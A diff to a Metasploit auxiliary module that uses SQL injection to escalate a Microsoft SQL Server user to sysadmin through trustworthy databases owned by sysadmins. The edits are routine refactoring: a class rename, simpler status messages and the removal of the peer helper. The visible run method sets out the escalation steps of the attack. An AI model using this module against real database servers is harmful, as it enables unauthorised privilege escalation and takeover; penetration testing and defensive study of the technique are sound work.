@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/exploit/mssql_commands'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MSSQL_SQLI
   include Msf::Auxiliary::Report
 
@@ -30,67 +28,63 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     # Get the database user name
-    print_status("#{peer} - Grabbing the database user name from ...")
+    print_status("Grabbing the database user name from ...")
     db_user = get_username
     if db_user.nil?
-      print_error("#{peer} - Unable to grab user name...")
+      print_error("Unable to grab user name...")
       return
     else
-      print_good("#{peer} - Database user: #{db_user}")
+      print_good("Database user: #{db_user}")
     end
 
     # Grab sysadmin status
-    print_status("#{peer} - Checking if #{db_user} is already a sysadmin...")
+    print_status("Checking if #{db_user} is already a sysadmin...")
     admin_status = check_sysadmin
 
     if admin_status.nil?
-      print_error("#{peer} - Couldn't retrieve user status, aborting...")
+      print_error("Couldn't retrieve user status, aborting...")
       return
     elsif admin_status == '1'
-      print_error("#{peer} - #{db_user} is already a sysadmin, no esclation needed.")
+      print_error("#{db_user} is already a sysadmin, no esclation needed.")
       return
     else
-      print_good("#{peer} - #{db_user} is NOT a sysadmin, let's try to escalate privileges.")
+      print_good("#{db_user} is NOT a sysadmin, let's try to escalate privileges.")
     end
 
     # Check for trusted databases owned by sysadmins
-    print_status("#{peer} - Checking for trusted databases owned by sysadmins...")
+    print_status("Checking for trusted databases owned by sysadmins...")
     trust_db_list = check_trust_dbs
     if trust_db_list.nil? || trust_db_list.length == 0
-      print_error("#{peer} - No databases owned by sysadmin were found flagged as trustworthy.")
+      print_error("No databases owned by sysadmin were found flagged as trustworthy.")
       return
     else
       # Display list of accessible databases to user
-      print_good("#{peer} - #{trust_db_list.length} affected database(s) were found:")
+      print_good("#{trust_db_list.length} affected database(s) were found:")
       trust_db_list.each do |db|
         print_status(" - #{db}")
       end
     end
 
     # Check if the user has the db_owner role in any of the databases
-    print_status("#{peer} - Checking if #{db_user} has the db_owner role in any of them...")
+    print_status("Checking if #{db_user} has the db_owner role in any of them...")
     owner_status = check_db_owner(trust_db_list)
     if owner_status.nil?
-      print_error("#{peer} - Fail buckets, the user doesn't have db_owner role anywhere.")
+      print_error("Fail buckets, the user doesn't have db_owner role anywhere.")
       return
     else
-      print_good("#{peer} - #{db_user} has the db_owner role on #{owner_status}.")
+      print_good("#{db_user} has the db_owner role on #{owner_status}.")
     end
 
     # Attempt to escalate to sysadmin
-    print_status("#{peer} - Attempting to add #{db_user} to sysadmin role...")
+    print_status("Attempting to add #{db_user} to sysadmin role...")
     escalate_privs(owner_status, db_user)
 
     admin_status = check_sysadmin
     if admin_status && admin_status == '1'
-      print_good("#{peer} - Success! #{db_user} is now a sysadmin!")
+      print_good("Success! #{db_user} is now a sysadmin!")
     else
-      print_error("#{peer} - Fail buckets, something went wrong.")
+      print_error("Fail buckets, something went wrong.")
     end
-  end
-
-  def peer
-    "#{rhost}:#{rport}"
   end
 
   def get_username
@@ -150,7 +144,7 @@ class Metasploit3 < Msf::Auxiliary
       return nil
     end
 
-    #Parse results
+    # Parse results
     parsed_result = res.body.scan(/#{clue_start}(.*?)#{clue_end}/m)
 
     if parsed_result && !parsed_result.empty?
